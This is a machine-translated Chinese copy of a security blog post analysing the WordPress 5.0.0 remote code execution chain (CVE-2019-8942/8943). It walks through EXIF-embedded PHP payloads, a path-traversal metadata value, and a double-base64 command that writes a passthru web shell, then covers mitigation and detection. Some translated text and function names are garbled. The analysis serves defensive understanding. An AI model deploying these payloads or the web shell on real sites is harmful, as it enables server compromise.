<html>
<head>
<title>Analysis of a WordPress Remote Code Execution Attack | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>对 WordPress 远程代码执行攻击的分析| Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942#2022-07-07T12:20:19.000Z">https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942#2022-07-07T12:20:19.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>这篇文章展示了我们对针对 WordPress 5 . 0 . 0 及更低版本的已知攻击(2019 年 2 月提交)的分析，该攻击授予入侵者在 web 服务器上执行<a href="https://pentest-tools.com/blog/log4shell-scanner-detect-cve-2021-44228">任意代码的权限</a>。本文涵盖了成功攻击所需的每个攻击步骤和 HTTP 请求。</p><p>我们将看到在 WordPress 5.0.0 中，路径遍历和本地文件包含漏洞的组合如何导致<strong> RCE。</strong></p><p>为了便于浏览，本文分为以下几个部分:</p><ol start="1"><li><p><a href="#1-background"> <strong>背景</strong> </a></p></li><li><p><a href="#2-target-configuration"> <strong>目标配置</strong> </a></p></li><li><p><a href="#3-what-is-the-root-cause-of-cve-2019-8942"><strong>CVE-2019-8942 的根本原因是什么？</strong>T3】</a></p></li><li><p><a href="#4-http-requests-for-exploitation"> <strong> HTTP 利用请求</strong> </a></p></li><li><p><a href="#5-existing-exploits"> <strong>现有战功</strong> </a></p></li><li><p><a href="#6-how-can-you-mitigate-the-vulnerability"> <strong>如何缓解漏洞？</strong>T3】</a></p></li><li><p><a href="#7-detection-using-pentest-toolscom"> <strong>检测使用 Pentest-Tools.com</strong></a></p></li></ol><h2 id="1-background"><strong> 1。背景</strong></h2><p>作为最受欢迎的内容管理系统，WordPress 经常成为黑客的攻击目标。易受攻击的 CMS 是攻击的诱因，这可能导致危及底层服务器的安全。</p><p>该攻击将 WordPress 中的路径遍历和本地文件包含(LFI)漏洞联系在一起。这些漏洞是由 RipsTech 在 2019 年 2 月发现的，西蒙·斯坎内尔在他们的博客上发布了<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">。</a></p><p>他们在<a target="_blank" rel="external nofollow noopener noreferrer" href="http://cve.mitre.org/"> MITRE 的</a>常见漏洞和暴露中的描述如下:</p><p><strong> CVE-2019-8942 </strong></p><div class="content-highlight"><pre class="code-block"><code>WordPress before 4.9.9 and 5.x before 5.0.1 allows remote code execution because an `_wp_attached_file` Post Meta entry can be changed to an arbitrary string, such as one ending with a .jpg?file.php substring. An attacker with author privileges can execute arbitrary code by uploading a crafted image containing PHP code in the Exif metadata. Exploitation can leverage CVE-2019-8943</code></pre></div><p><strong> CVE-2019-8943 </strong></p><div class="content-highlight"><pre class="code-block"><code>WordPress through 5.0.3 allows Path Traversal in wp_crop_image(). An attacker (who has privileges to crop an image) can write the output image to an arbitrary directory via a filename containing two image extensions and ../ sequences, such as a filename ending with the .jpg?/../../file.jpg substring.</code></pre></div><p><strong>开采要求:</strong></p><p>要成功执行此攻击场景并利用这两个漏洞，需要满足以下条件:</p><h2 id="2-target-configuration"><strong> 2。目标配置</strong></h2><p>我们在 Ubuntu 虚拟机上安装了一个易受攻击的 WordPress 实例(v5.0.0)。在开始安装 WordPress 之前，确保将这两行添加到 wp-config.php 文件中:</p><div class="content-highlight"><pre class="code-block"><code>define('AUTOMATIC_UPDATER_DISABLED',true);

define('WP_AUTO_UPDATE_CORE',false);</code></pre></div><p>添加两行是必要的，因为它们禁用了 WordPress 中的自动更新。否则，CMS 实例会以无人值守的方式安装不受这两个漏洞影响的最新版本。</p><p>一旦你运行了 WordPress，通过查看管理面板，确保它是正确的版本:</p><p><img src="../Images/20fe9829ff1a8abe88b0549fb1b2a94f.png" alt="wordpress dashboard" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvd29yZHByZXNzLWRhc2hib2FyZC5wbmc=?s=c9614d0230232782af9eccfd05feaa83"/>现在我们必须创建一个具有作者角色的新用户:</p><p><img src="../Images/9ce309104a98e16b6ba0311da5bf71e3.png" alt="wordpress add new user" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbmV3LXVzZXIucG5n?s=189141073d1a73ad62108dde3821f0c3"/></p><h2 id="3-what-is-the-root-cause-of-cve-2019-8942"><strong> 3。CVE-2019-8942 的根本原因是什么？</strong></h2><p><strong>简短版本:</strong>帖子元条目可以被覆盖。</p><p><strong>长版:</strong>一个 WordPress 网站的构建块叫做模板文件。它们定义了内容在网页上的显示方式。</p><p>博客与博客文章或帖子是一回事，可以有各种格式:音频、图像、链接、引用、视频、图库等等。一篇文章可能包含多个元素:标题、文章撰写的日期、正文、作者和关于文章的其他数据；所有这些都是帖子的附加信息，也称为元数据。</p><p>我们以一个图片帖子为例。在 WordPress 4.9.9 和 5.0.1 之前，一张图片更新时，调用<code>edit_post()</code>函数，直接作用于<code>$_POST</code>数组。该数组包含多个元素，如标题、内容、帖子的日期等，但更重要的变量是<code>meta_input</code>、<code>file</code>和<code>guid</code>。</p><p>在 WordPress 易受攻击的版本中，<code>wpupdatepost</code>函数直接将$post <em>数据作为参数，而不检查不允许的 post 数据字段。因此，拥有作者权限的用户可以通过恶意覆盖 meta </em>输入参数来更改帖子的元数据。</p><p><img src="../Images/20bf0ace98fd98eea2d1b5d1a88e0dc1.png" alt="wordpress blog update post" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvd3AtdXBkYXRlLXBvc3QucG5n?s=6957452027e1a450825f1baecbe94937"/></p><h2 id="4-http-requests-for-exploitation"><strong> 4。利用漏洞的 HTTP 请求</strong></h2><p>只需要 4 个 HTTP POST 请求就可以利用这两个漏洞并获得远程代码执行，如以下步骤所述:</p><p>基本上，我们将上传包含 PHP 代码的图像文件。然后我们改变它的一个元数据<code>wpattached_file</code>，使它包含一个路径遍历有效载荷(<code>?/../../../../themes/twentynineteen/shell</code>)。</p><p>当裁剪图像时，它的元数据被修改，并且在存储其他模板文件的<code>themes/twentynineteen</code>目录中自动创建一个名为 cropped-shell.jpg 的副本。</p><p>最后，通过用图像的裁剪版本作为模板创建一个新的图像帖子，我们确保了 PHP 代码在博客帖子打开时被执行。</p><h3 id="order-of-requests"><strong>请求顺序</strong></h3><p>1.上传包含 PHP 代码的图片。该图片名为<strong> image <em>，文件名为</em> php_code.jpg </strong>，大小为 262×192 像素。</p><p>请求:</p><p><img src="../Images/784fd39852a5c64db9cc19afe7613671.png" alt="http request wordpress blog" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVxdWVzdC0xLnBuZw==?s=299fce1ae5972c951313182f7ead07dc"/>响应包含为图像新创建的<code>post_ID</code>:</p><p><img src="../Images/981f9323d47405961ff1636304a80a7b.png" alt="http response wordpress blog" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVzcG9uc2UtMS5wbmc=?s=06da17147868fea43b20c77ce9815704"/> 2。通过将图像的元数据<code>meta_input</code>更改为<code>2019/05/imagewithphp_code.jpg?/../../../../themes/twentynineteen/shell</code>来编辑图像</p><p>请求:</p><p><img src="../Images/49abdbda65adf6691c0cae104513356f.png" alt="http request wordpress image" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVxdWVzdC0yLnBuZw==?s=a26dce2e603d5a1bc0ddfaf92567c90c"/>回应:</p><p><img src="../Images/718646b7ed92a2f8f35185a8b1ec179d.png" alt="http response wordpress image" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVzcG9uc2UtMi5wbmc=?s=fdf521aaf3af1c415caeebd76bd251bb"/> 3。我们裁剪图像(新尺寸:262×192)。这是一个假裁剪，因为图像的大小不会改变。</p><p>请求:</p><p><img src="../Images/c14d0f41b8d353637f0677b6c5a8e5c9.png" alt="http request wordpress admin" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVxdWVzdC0zLnBuZw==?s=1fd119454a6552a3c907a948cdd6b47a"/>回应:</p><p><img src="../Images/3b789905eeb50be564ae92a575e08fc1.png" alt="http response wordpress admin" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVzcG9uc2UtMy5wbmc=?s=92b013d971cf7ff78df342e16445f267"/>因为图像文件现在带有修改后的元数据，所以副本会自动保存在 themes/twenty 19 目录中。</p><p><img src="../Images/79f5dfa2ccc2b9431fabad8ac4ff3c86.png" alt="image file in virtual box" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvY3JvcHBlZC1zaGVsbC5wbmc=?s=36e631e68d0f488a1785eb0785219d6b"/> 4。现在我们使用模板<code>cropped-shell.jpg</code>发布一篇文章</p><p>请求:</p><p><img src="../Images/0bf302fba7341f9fbff4a0f66f44e00b.png" alt="http request wp admin post using cropped shell" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVxdWVzdC00LnBuZw==?s=6ff49367e3baabfa3024dbda4b40fff1"/>收到以下回复:</p><p><img src="../Images/e7e5817e5ff5d78bf2d5f24bbdf463f4.png" alt="http response wp admin post using cropped shell" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVzcG9uc2UtNC5wbmc=?s=b31b08a0e23efff8af4e7b685920ed67"/></p><h3 id="view-the-result"><strong>查看结果</strong></h3><p>此时，我们只需查看新发布的帖子，就可以看到执行 PHP 代码的结果。以下是 Burp 中的 HTTP 响应:</p><p><img src="../Images/5d82b37bcf556974f77ebfd57ea6a2a8.png" alt="HTTP request and response in Burp" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcmVxdWVzdC1idXJwLnBuZw==?s=27351983158f30da95a45f0e2c355004"/>这是它在网络浏览器中的样子:<img src="../Images/d6cfa52c5070d40016a84ccd36cf4e52.png" alt="HTTP request in browser" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvd2ViLWJyb3dzZXIucG5n?s=0b2aabb82877d1a182273c8fa8a88d20"/></p><h2 id="5-existing-exploits"><strong> 5。现有漏洞</strong></h2><p>目前，有两个公开利用实施这一攻击。</p><h3 id="exploit-1"><strong>漏洞利用#1 </strong></h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/46511/"> JavaScript 漏洞利用</a>:该漏洞利用将以下命令注入 JPEG 图像的 EXIF 元数据:<code>&lt;?php phpinfo();/*</code></p><p>下面你可以看到一段来自公开漏洞的摘录，其中包括 JPEG 图像的十六进制数据。占位符<code>\x07PAYLOAD</code>将被上述命令替换。这个占位符有一个有限的大小，这就是为什么我们需要 18 个字符或更少的有效载荷。</p><p><img src="../Images/82f07f4285fc930d0675865d840e359a.png" alt="existing exploit payload" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcGxhY2Vob2xkZXIucG5n?s=613283d7377c4466453d68fd69f7902a"/>可以缩短命令<code>&lt;?=phpinfo();?&gt;</code>而不改变结果。下面你可以看到精心制作的图像的 hexdump，包含我们的有效载荷:</p><p>我们决定利用这段代码，把它变成在服务器上运行命令的入口点。有效载荷的新形式将是:<code>&lt;?=$_GET[0];?&gt;</code></p><p>当有效负载被执行时，攻击者可以使用这个 URL 运行任何命令:<code>http://localhost/wordpress/index.php/2019/05/07/rce-45/?0=id</code></p><p>一个更强大的 shell 需要更大的有效负载，这是不可能通过注入 JPEG 文件的 EXIF 数据实现的；但是有一种方法可以绕过这个限制。为此，我们通过滥用上面的 URL 创建了一个新的 PHP 文件。</p><p>我们希望在服务器上创建一个包含以下内容的<code>shell.php</code>文件:</p><p><code>&lt;?php passthru($_GET[0]);?&gt;</code></p><p>我们能够做到这一点，并通过使用 base64 方案对内容进行编码来避免转义特殊字符。但是，encoding 在字符串末尾添加了一个“+”号；这破坏了 URL，因为浏览器将“+”视为空格字符，就像“%20”一样解决方案是使用 base64 对有效载荷进行双重编码。</p><p><img src="../Images/ff7a684336b30a8c132a9e741081ccbf.png" alt="payload encoded using base64" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvaW8tMS5wbmc=?s=49f549352ee36e34e74c656e2b8f9fb9"/></p><p><img src="../Images/bd00fc2f40187969573349a86a0f7679.png" alt="payload encoded with a specific string" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvaW8tMi5wbmc=?s=658b4822c23c7b364f21f9fcce928790"/></p><p>最终我们得到了下面的字符串:<code>UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KRjlIUlZSYk1GMHBPejgr</code>；然后，我们将编码的内容包含在 URL 中，并获得了以下字符串:</p><p>http://localhost/WordPress/index。PHP/2019/04/18/rce-38/？0= <code>echo UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KRjlIUlZSYk1GMHBPejgr|base64 -d|base64 -d &gt; shell.php</code></p><p>新创建的后门可以直接从 WordPress 的根文件夹中调用。<img src="../Images/4d909013a9a6da8dd653cc00be8ed428.png" alt="root folder of Wordpress" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvd29yZHByZXNzLnBuZw==?s=6e5ea3a4f7214c96f11645528778bb75"/></p><h3 id="exploit-2"><strong>漏洞利用#2 </strong></h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/46662/"> Metasploit 模块</a>–<code>exploit/multi/http/wpcroprce</code></p><p>Metasploit 模块很简单，需要凭据才能作为作者向 WordPress 的易受攻击实例进行身份验证。</p><p>设置阶段:</p><p><img src="../Images/5017e3ba69c4635d80f640d13f0e0d0f.png" alt="Metasploit module setup stage" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvc2V0dXAtc3RhZ2UucG5n?s=f41c31348718ba0d5f6334dbb305cf14"/>剥削阶段:<img src="../Images/4230ec6303e76d521cf6830eab661957.png" alt="Metasploit module exploitation stage" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvZXhwbG9pdGF0aW9uLTEucG5n?s=71eae7da21461f77ef384aed6d20cc75"/> <img src="../Images/fbcb6dc9f1e9d1ebef3fb3f8e4efef18.png" alt="Metasploit module preview exploitation" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvZXhwbG9pdGF0aW9uLTIucG5n?s=b8353fc27aedc7a45ab2ed3175640ce3"/></p><p>在调查这两个漏洞时，我们发现<code>wp‑includes/media.php</code>文件包含一个名为<code>wpimageeditorchoose</code>的函数，该函数检查是否至少有<strong> ImageMagick </strong>或<strong> GD </strong>图像库可以使用；前者的优先级高于后者。</p><p>这里的关键是，虽然 ImageMagick 保留了图像的 EXIF 元数据，但 GD 在处理(裁剪/调整大小/编辑)图像时会删除它，因此有效负载不再可用。</p><p>下面的截图显示了<code> &lt;?=phpinfo();?&amp;gt</code>；GD 库处理图像时不执行代码，因为它剥离了 EXIF 元数据:</p><p><img src="../Images/2fb662df647ab20e0bad5582a514a534.png" alt="EXIF metadata" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbWV0YWRhdGEucG5n?s=45607286b8b55fa0b8bb92831c4ede85"/>所以如果想给自己的图片添加 PHP 有效载荷，需要确保安装了 ImageMagick 否则，您将不知道裁剪操作后有效载荷是否仍存在于 EXIF 元数据中。</p><p>要安装<code>php-imagick</code>,您可以在终端中运行以下命令:</p><div class="content-highlight"><pre class="code-block"><code>$ sudo apt-get install php-imagick</code></pre></div><p><strong>注意！</strong>我们在分析漏洞链时观察到的另一个有趣现象是，为 Metasploit 编写的漏洞也可以与 GD 一起使用(ImageMagick 不需要存在于系统中)。此漏洞利用所使用的图像中插入的 PHP 代码在调整大小后仍然存在，并且可以在裁剪后的文件中找到。</p><h2 id="6-how-can-you-mitigate-the-vulnerability"><strong> 6。您如何缓解该漏洞？</strong></h2><p>简短回答:总是将你的 WordPress 安装更新到最新版本。</p><p><strong>长回答:</strong>从代号为“Betty”的 WordPress v5.1 开始，有一个名为<code>wpgetallowedpostdata</code>的新函数，它只返回允许的 post 数据字段，并从 post 数据数组中删除<code>meta_input</code>、<code>file</code>和<code>guid</code>字段。</p><p><img src="../Images/9fd7a325c1c3cc506c0eb63c36433419.png" alt="wp post data field" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbG9uZy0xLnBuZw==?s=e73b0fe641392508fa8d52120c8ee35e"/>函数<code>wpgetallowedpostdata</code>以后称为:</p><p><img src="../Images/2f5900b687f1f1a9fb787868ec7ba86f.png" alt="wp get allowed post data function" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbG9uZy0yLnBuZw==?s=87ed9e937e8d012743d2a7ef7237107f"/>和<code>wpupdatepost</code>函数把新清理的变量<code>$translated</code>作为参数。</p><p>为了更好地理解<code>$post_data</code>和<code>$translated</code>变量内容的不同，我们在 post.php 文件中插入了两个钩子；这将两个变量的内容重定向到<code>/var/log/apache2/error.log</code>。</p><p><code>errorlog(“DEBUG – postdata variable: “.varexport($postdata,TRUE));</code></p><p><img src="../Images/95f368b914d72fa2335b81fafb5259d4.png" alt="error log post data variable" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbG9uZy00LnBuZw==?s=e5b4fb7b8973ea2c9c2a98453a26be70"/> <code>errorlog(“DEBUG – translated variable:”.varexport($translated,TRUE));</code></p><p><img src="../Images/153ac2d414cb43f78a6db4bba9d17ac5.png" alt="error log translated variable" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvbG9uZy01LnBuZw==?s=85f1f46433f06bd1acc12dc2e4034c26"/>很容易看出<code>$translated</code>变量不包含上面突出显示的<code>meta_input</code>字段。</p><p>我们使用了<a rel="noopener noreferrer" href="https://pentest-tools.com/cms-vulnerability-scanning/wordpress-scanner-online-wpscan"> WordPress 漏洞扫描器</a>来检查我们的测试 WordPress 版本是否容易受到 CVE-2019-8942 的攻击。我们通过将扫描仪对准我们 VM 中的 WordPress 安装(因此是 http://127.0.0.1)并检查结果来做到这一点。</p><p><img src="../Images/44119e0fe229722769a971a2e068f03a.png" alt="website vulnerability scanner report" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvd29yZHByZXNzLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1leHBsb2l0LWN2ZS0yMDE5LTg5NDIvcGVudGVzdC10b29scy1zY2FubmVyLnBuZw==?s=3ce7298ce183616e236e5a4e7ef94737"/>如上图所示，漏洞检测结果为阳性。</p><h2 id="references-and-acknowledgments"><strong>参考文献和致谢</strong></h2><p>感谢西蒙·斯坎内尔回答了我的一些问题。</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>